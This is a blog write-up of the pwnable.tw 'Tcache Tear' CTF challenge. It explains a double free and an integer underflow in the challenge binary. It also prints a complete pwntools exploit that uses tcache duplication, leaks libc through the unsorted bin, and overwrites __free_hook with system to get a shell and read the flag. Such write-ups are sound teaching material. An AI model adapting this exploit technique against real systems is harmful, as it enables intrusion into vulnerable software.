<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>Binary Exploitation [pwnable.tw] - Tcache Tear - Tainted Bits</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Tainted Bits"><meta name="msapplication-TileImage" content="/images/logo-header.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Tainted Bits"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="Challange Description        Name Tcache Tear   Points 200   Solves 433 times   Libc 2.27   Category Exploitation   Description Make tcache great again !"><meta property="og:type" content="article"><meta property="og:title" content="Binary Exploitation [pwnable.tw] - Tcache Tear"><meta property="og:url" content="https://www.taintedbits.com/2020/07/18/binary-exploitation-pwnable-tw-tcache-tear/"><meta property="og:site_name" content="Tainted Bits"><meta property="og:description" content="Challange Description        Name Tcache Tear   Points 200   Solves 433 times   Libc 2.27   Category Exploitation   Description Make tcache great again !"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://www.taintedbits.com/2020/07/18/binary-exploitation-pwnable-tw-tcache-tear/checksec.png"><meta property="og:image" content="https://www.taintedbits.com/2020/07/18/binary-exploitation-pwnable-tw-tcache-tear/flag.png"><meta property="article:published_time" content="2020-07-17T18:30:00.000Z"><meta property="article:modified_time" content="2021-06-07T07:03:12.672Z"><meta property="article:author" content="D3xt3r"><meta property="article:tag" content="Linux"><meta property="article:tag" content="CTF"><meta property="article:tag" content="pwnable"><meta property="article:tag" content="Exploitation"><meta property="article:tag" content="pwnable-tw"><meta property="article:tag" content="Heap Exploitation"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="checksec.png"><meta property="twitter:creator" content="@0xd3xt3r"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.taintedbits.com/2020/07/18/binary-exploitation-pwnable-tw-tcache-tear/"},"headline":"Tainted Bits","image":["https://www.taintedbits.com/2020/07/18/binary-exploitation-pwnable-tw-tcache-tear/checksec.png","https://www.taintedbits.com/2020/07/18/binary-exploitation-pwnable-tw-tcache-tear/flag.png"],"datePublished":"2020-07-17T18:30:00.000Z","dateModified":"2021-06-07T07:03:12.672Z","author":{"@type":"Person","name":"D3xt3r"},"description":"Challange Description        Name Tcache Tear   Points 200   Solves 433 times   Libc 2.27   Category Exploitation   Description Make tcache great again !"}</script><link rel="alternate" href="/atom.xml" title="Tainted Bits" type="application/atom+xml"><link rel="icon" href="/images/logo-header.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/railscasts.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><script src="https://www.googletagmanager.com/gtag/js?id=UA-128181439-1" async></script><script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","UA-128181439-1")</script><meta name="generator" content="Hexo 5.4.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/images/logo-header.png" alt="Tainted Bits" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/publications">Publication</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0xd3xt3r"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time datetime="2020-07-17T18:30:00.000Z" title="7/18/2020, 12:00:00 AM">2020-07-18</time></span><span class="level-item">Updated&nbsp;<time datetime="2021-06-07T07:03:12.672Z" title="6/7/2021, 12:33:12 PM">2021-06-07</time></span><span class="level-item"><a class="link-muted" href="/categories/CTF-Writeups/">CTF Writeups</a></span><span class="level-item">10 minutes read (About 1482 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">Binary Exploitation [pwnable.tw] - Tcache Tear</h1><div class="content"><h1 id="Challange-Description"><a href="#Challange-Description" class="headerlink" title="Challange Description"></a>Challange Description</h1><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>Name</td><td>Tcache Tear</td></tr><tr><td>Points</td><td>200</td></tr><tr><td>Solves</td><td>433 times</td></tr><tr><td>Libc</td><td>2.27</td></tr><tr><td>Category</td><td>Exploitation</td></tr><tr><td>Description</td><td>Make tcache great again !</td></tr></tbody></table><span id="more"></span><h1 id="Binary-Protection"><a href="#Binary-Protection" class="headerlink" title="Binary Protection"></a>Binary Protection</h1><p>Let’s check the binary protection</p><p><img src="checksec.png" alt="Binary Protection"></p><h1 id="The-Vulnerability"><a href="#The-Vulnerability" class="headerlink" title="The Vulnerability"></a>The Vulnerability</h1><p>The application simply allocates a memory chunk and frees it. There is a main loop code which runs in infinite loop which is as shown below.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">This code decompilated by GHIDRA</span></span><br><span class="line"><span class="comment">This is the main application code which run in infinite loop</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">long</span> action_input;</span><br><span class="line">  uint free_count;</span><br><span class="line">  env_setup();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">  <span class="comment">// read data in global buffer</span></span><br><span class="line">  read_input_to_buf(DAT_username,<span class="number">32</span>);</span><br><span class="line">  free_count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">      <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">        action_menu();</span><br><span class="line">        action_input = read_int();</span><br><span class="line">        <span class="keyword">if</span> (action_input != <span class="number">2</span>) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> (free_count &lt; <span class="number">8</span>) &#123;</span><br><span class="line">            <span class="comment">// Free the allocated memory chunk</span></span><br><span class="line">            <span class="built_in">free</span>(DAT_input_buf);</span><br><span class="line">            free_count = free_count + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="number">2</span> &lt; action_input) <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> (action_input == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// Allocate object and feed the data to</span></span><br><span class="line">        obj_malloc();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        LAB_00400c75:</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;Invalid choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (action_input != <span class="number">3</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (action_input == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">goto</span> LAB_00400c75;</span><br><span class="line">    &#125;</span><br><span class="line">    print_username();</span><br><span class="line">  &#125; <span class="keyword">while</span>( <span class="literal">true</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>There is a vulnerability on line 21 where it frees the allocated memory chunk but it doesn’t null-out that pointer.</p><p>There is another vulnerability is in object allocation code. The code is as show below, try to understand the find the vulnerability yourself.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">obj_malloc</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  ulong buf_size;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size:&quot;</span>);</span><br><span class="line">  buf_size = read_int();</span><br><span class="line">  <span class="keyword">if</span> (buf_size &lt; <span class="number">256</span>) &#123;</span><br><span class="line">    DAT_input_buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(buf_size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Data:&quot;</span>);</span><br><span class="line">    <span class="comment">// read the user input into the buffer and with</span></span><br><span class="line">    <span class="comment">// buffer size check</span></span><br><span class="line">    read_input_to_buf(DAT_input_buf,(<span class="keyword">int</span>)buf_size + <span class="number">-16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The size of the buffer is taken from user and 16 is subtracted from that, the result is converted to unsigned integer and used as max user input buffer size. So if you provide the number less then 16, then the subtraction result is negative number, which if converted to unsigned number will result in very high value. So if we provide buffer size less then 16 you will get out-of-bound write. This kind of vulnerability is called Integer overflow. We will utilize this out-of-bound write with other vulnerability to get further exploit this challange.</p><p>There are some of the constraints of the application that we influence our exploitation:</p><ol><li>You can’t allocate buffer size more than 256 bytes, this restricts the buffer allocation to only Tcache bins.</li><li>Application tracks only one allocated buffer at a time.</li></ol><h1 id="Write-Primitive"><a href="#Write-Primitive" class="headerlink" title="Write Primitive"></a>Write Primitive</h1><p>In the main code loop, the pointer of the memory chuck allocated by obj_malloc(on line 15) is not nulled-out after free(on line 15) this can be used to do double free. In Tcache Tear there is no check for dublicate entry check in free list so we can do double free to do <a target="_blank" rel="noopener" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c">duplicate Tcache Tear Attack</a>. This attack return arbitrary address on calling malloc which will give opportunity write data to that address.</p><p>We will use this write primitive to create read primitive which will help us to Leak Libc address. Below is the code to create arbitrary write :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">app = App(io)</span><br><span class="line">user_payload = p64(<span class="number">0</span>) + p64(<span class="number">0x501</span>)</span><br><span class="line">app.username(user_payload)</span><br><span class="line">app.intro()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arby_write</span>(<span class="params">write_addr, write_val, bin_sz=<span class="number">10</span></span>):</span></span><br><span class="line">    app.malloc(bin_sz, <span class="string">&#x27;AAAAAAAA&#x27;</span>)</span><br><span class="line">    app.free()</span><br><span class="line">    app.free()</span><br><span class="line">    app.malloc(bin_sz, write_addr)</span><br><span class="line">    <span class="comment"># tcache bins pointers to arbitrary addr</span></span><br><span class="line">    app.malloc(bin_sz, <span class="string">&#x27;junk&#x27;</span>)</span><br><span class="line">    <span class="comment"># tcache return arbitrary address and write there</span></span><br><span class="line">    app.malloc(bin_sz, write_val)</span><br></pre></td></tr></table></figure><h1 id="The-Leak"><a href="#The-Leak" class="headerlink" title="The Leak"></a>The Leak</h1><p>In the attack we just discussed, a fake chuck has to be crafted in the tcachebin and the fake chunk will be constructed in the <em>DAT_username</em> buffer. The reason for crafting fake chunk in <em>DAT_username</em> is that its in <strong>bss segment</strong> and the PIE of the binary is disabled. So the address of the <em>DAT_username</em> will be fixed (<em>0x602060</em>). The size(0x500) fake chuck will be such that on freeing, it will land in unsorted bin. To put it more clearly the fake chunk we will put will be in tcache bin(lets say of size 0x10) but the fake chunk itself will be of larger size(0x500). Then later we will allocate chunk from the same tcache bin(0x10) till it return the fake chunk, immediately we will do free on the memory, it will put the fake chunk in the unsorted-bin.</p><p>Since the Unsorted bins is doubly linked list when we put the chunk in the unsorted bin, it is populated with fd and bk pointer with the next and previous memory chunk. When there is just one chunk in the Unsorted in then the fd and bk pointer has main arena address. We can print the content <em>DAT_username</em> in the application and since this chunk is in Unsorted bin we have leaked the main arena address. We can calculate the Libc base address using the main arena address.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">FAKE_CHUNK = <span class="number">0x602060</span></span><br><span class="line"></span><br><span class="line">TARGET_ADDR = p64(FAKE_CHUNK + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage_init</span>():</span></span><br><span class="line">    <span class="comment"># chunk 1</span></span><br><span class="line">    fake_chunk_payload = p8(<span class="number">0x41</span>) * (<span class="number">0x18</span>) + \</span><br><span class="line">        p64(FAKE_CHUNK + <span class="number">0x10</span>) + p8(<span class="number">0x41</span>) * (<span class="number">0x500</span>-<span class="number">0x18</span>-<span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># chunk 2</span></span><br><span class="line">    fake_chunk_payload += p64(<span class="number">0x500</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x42</span>) * <span class="number">0x10</span></span><br><span class="line">    <span class="comment"># chunk 3</span></span><br><span class="line">    fake_chunk_payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x43</span>) * <span class="number">0x10</span></span><br><span class="line">    <span class="comment"># chunk 4</span></span><br><span class="line">    fake_chunk_payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x43</span>) * <span class="number">0x10</span></span><br><span class="line">    arby_write(TARGET_ADDR, fake_chunk_payload)</span><br><span class="line">    app.free()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_addr</span>():</span></span><br><span class="line">    info = app.info()</span><br><span class="line">    main_arena_leak = u64(info[<span class="number">30</span>:<span class="number">28</span>+<span class="number">10</span>])</span><br><span class="line">    BASE_OFFSET = <span class="number">0x3ebca0</span></span><br><span class="line">    libc_base = main_arena_leak - BASE_OFFSET</span><br><span class="line">    log.info(<span class="string">&#x27;Arena leak   : &#x27;</span> + <span class="built_in">hex</span>(main_arena_leak))</span><br><span class="line">    log.info(<span class="string">&#x27;Libc Base    : &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br></pre></td></tr></table></figure><h1 id="Code-Execution"><a href="#Code-Execution" class="headerlink" title="Code Execution"></a>Code Execution</h1><p>To get code execution we will overwrite <strong>__free_hook</strong> with the system function to get system shell. To eloborate more on this first you have to allocate chunk with ‘/bin/sh’ as its content, and when you free that chunk. The pointer to that chunk is passed to <em>__free_hook</em> if the hook is not null. Since the free hook address is <em>system function</em> address, the call effectively execute <em>system(/bin/sh)</em> which give us a shell. Below is the code to run above mentioned steps.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage_final</span>():</span></span><br><span class="line">    app.malloc(<span class="number">50</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;Triggering shell&#x27;</span>)</span><br><span class="line">    app.free(shell=<span class="literal">True</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;You should have the flag now&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;cat /home/tcache_tear/flag&#x27;</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;Flag : &#x27;</span> + io.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h1 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Author : 0xd3xt3r</span></span><br><span class="line"><span class="string">Website : taintedbits.com</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">LOCAL = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">LIBC_FILE = <span class="string">&#x27;./libc-ctf.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> LOCAL:</span><br><span class="line">    io = process(<span class="string">&#x27;./tcache_tear&#x27;</span>, env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: LIBC_FILE&#125;, aslr=<span class="literal">False</span>, timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10207</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(LIBC_FILE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, proc</span>):</span></span><br><span class="line">        self.proc = proc</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">intro</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;choice :&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">username</span>(<span class="params">self, data</span>):</span></span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        self.proc.send(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">malloc</span>(<span class="params">self, sz, data</span>):</span></span><br><span class="line">        self.proc.send(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        self.proc.send(<span class="built_in">str</span>(sz))</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        self.proc.send(data)</span><br><span class="line">        self.proc.readuntil(<span class="string">&#x27;choice :&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">self, shell=<span class="literal">False</span></span>):</span></span><br><span class="line">        self.proc.send(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">            self.proc.readuntil(<span class="string">&#x27;choice :&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.proc.send(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> self.proc.readuntil(<span class="string">&#x27;choice :&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FAKE_CHUNK = <span class="number">0x602060</span></span><br><span class="line"></span><br><span class="line">TARGET_ADDR = p64(FAKE_CHUNK + <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">app = App(io)</span><br><span class="line">user_payload = p64(<span class="number">0</span>) + p64(<span class="number">0x501</span>)</span><br><span class="line">app.username(user_payload)</span><br><span class="line">app.intro()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">arby_write</span>(<span class="params">write_addr, write_val, bin_sz=<span class="number">10</span></span>):</span></span><br><span class="line">    <span class="string">&#x27;this method gives us arbitrary write&#x27;</span></span><br><span class="line">    app.malloc(bin_sz, <span class="string">&#x27;AAAAAAAA&#x27;</span>)</span><br><span class="line">    app.free()</span><br><span class="line">    app.free()</span><br><span class="line">    app.malloc(bin_sz, write_addr)</span><br><span class="line">    <span class="comment"># tcache bins pointers to arbitrary addr</span></span><br><span class="line">    app.malloc(bin_sz, <span class="string">&#x27;junk&#x27;</span>)</span><br><span class="line">    <span class="comment"># tcache return arbitrary address and write there</span></span><br><span class="line">    app.malloc(bin_sz, write_val)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage_init</span>():</span></span><br><span class="line">    <span class="comment"># chunk 1</span></span><br><span class="line">    fake_chunk_payload = p8(<span class="number">0x41</span>) * (<span class="number">0x18</span>) + \</span><br><span class="line">        p64(FAKE_CHUNK + <span class="number">0x10</span>) + p8(<span class="number">0x41</span>) * (<span class="number">0x500</span>-<span class="number">0x18</span>-<span class="number">0x18</span>)</span><br><span class="line">    <span class="comment"># chunk 2</span></span><br><span class="line">    fake_chunk_payload += p64(<span class="number">0x500</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x42</span>) * <span class="number">0x10</span></span><br><span class="line">    <span class="comment"># chunk 3</span></span><br><span class="line">    fake_chunk_payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x43</span>) * <span class="number">0x10</span></span><br><span class="line">    <span class="comment"># chunk 4</span></span><br><span class="line">    fake_chunk_payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x21</span>) + p8(<span class="number">0x43</span>) * <span class="number">0x10</span></span><br><span class="line">    arby_write(TARGET_ADDR, fake_chunk_payload)</span><br><span class="line">    app.free()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_addr</span>():</span></span><br><span class="line">    info = app.info()</span><br><span class="line">    main_arena_leak = u64(info[<span class="number">30</span>:<span class="number">28</span>+<span class="number">10</span>])</span><br><span class="line">    BASE_OFFSET = <span class="number">0x3ebca0</span></span><br><span class="line">    libc_base = main_arena_leak - BASE_OFFSET</span><br><span class="line">    log.info(<span class="string">&#x27;Arena leak   : &#x27;</span> + <span class="built_in">hex</span>(main_arena_leak))</span><br><span class="line">    log.info(<span class="string">&#x27;Libc Base    : &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="keyword">return</span> libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage_overwrite</span>(<span class="params">libc_base</span>):</span></span><br><span class="line">    free_hook_addr = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;__free_hook  : &#x27;</span> + <span class="built_in">hex</span>(free_hook_addr))</span><br><span class="line">    log.info(<span class="string">&#x27;system       : &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line">    app.malloc(<span class="number">100</span>, <span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">    arby_write(p64(free_hook_addr), p64(system_addr), <span class="number">40</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;Finished system func&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage_final</span>():</span></span><br><span class="line">    app.malloc(<span class="number">50</span>, <span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;Triggering shell&#x27;</span>)</span><br><span class="line">    app.free(shell=<span class="literal">True</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;You should have the flag now&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;cat /home/tcache_tear/flag&#x27;</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;Flag : &#x27;</span> + io.read().decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----[ ACTION</span></span><br><span class="line"></span><br><span class="line">stage_init()</span><br><span class="line">libc_base = leak_addr()</span><br><span 